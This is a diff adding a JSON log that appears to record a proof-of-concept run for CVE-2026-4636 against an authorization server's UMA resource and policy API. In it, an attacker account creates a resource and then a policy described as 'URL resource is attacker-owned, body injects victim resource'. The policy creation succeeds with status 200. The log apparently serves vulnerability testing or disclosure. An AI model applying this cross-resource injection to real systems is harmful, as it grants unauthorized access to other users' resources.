@@ -1,0 +1,80 @@
+[
+  {
+    "attacker_create_request": {
+      "attributes": {
+        "anypoc": [
+          "cve-2026-4636-poc"
+        ]
+      },
+      "name": "PoC Marta Path Resource 1788600912599-1",
+      "ownerManagedAccess": true,
+      "scopes": [
+        {
+          "name": "Scope A"
+        },
+        {
+          "name": "Scope B"
+        },
+        {
+          "name": "Scope C"
+        }
+      ]
+    },
+    "attacker_create_response": {
+      "_id": "dee75647-d81f-4922-8990-26589e20aca4",
+      "name": "PoC Marta Path Resource 1788600912599-1",
+      "owner": {
+        "id": "131f1619-cc65-455f-82cf-8e5d7dd6cf77",
+        "name": "marta"
+      },
+      "ownerManagedAccess": true,
+      "resource_scopes": [
+        {
+          "id": "01b4947f-89aa-492c-ae6a-4b4814827d70",
+          "name": "Scope B"
+        },
+        {
+          "id": "8c034794-986f-4575-96b1-26678a672b90",
+          "name": "Scope A"
+        },
+        {
+          "id": "c7dac591-abad-46fe-a096-c26385f400cd",
+          "name": "Scope C"
+        }
+      ],
+      "scopes": [
+        {
+          "id": "01b4947f-89aa-492c-ae6a-4b4814827d70",
+          "name": "Scope B"
+        },
+        {
+          "id": "8c034794-986f-4575-96b1-26678a672b90",
+          "name": "Scope A"
+        },
+        {
+          "id": "c7dac591-abad-46fe-a096-c26385f400cd",
+          "name": "Scope C"
+        }
+      ],
+      "uris": []
+    },
+    "attacker_resource_id": "dee75647-d81f-4922-8990-26589e20aca4",
+    "attempt": 1,
+    "policy_creation_response": {
+      "decisionStrategy": "UNANIMOUS",
+      "description": "URL resource is attacker-owned, body injects victim resource",
+      "id": "7f927513-d5d2-4a6b-8b34-548c4653db09",
+      "logic": "POSITIVE",
+      "name": "cve-2026-4636-cross-resource-1788600912",
+      "owner": "131f1619-cc65-455f-82cf-8e5d7dd6cf77",
+      "scopes": [
+        "Scope A"
+      ],
+      "type": "uma",
+      "users": [
+        "marta"
+      ]
+    },
+    "policy_creation_status": 200
+  }
+]
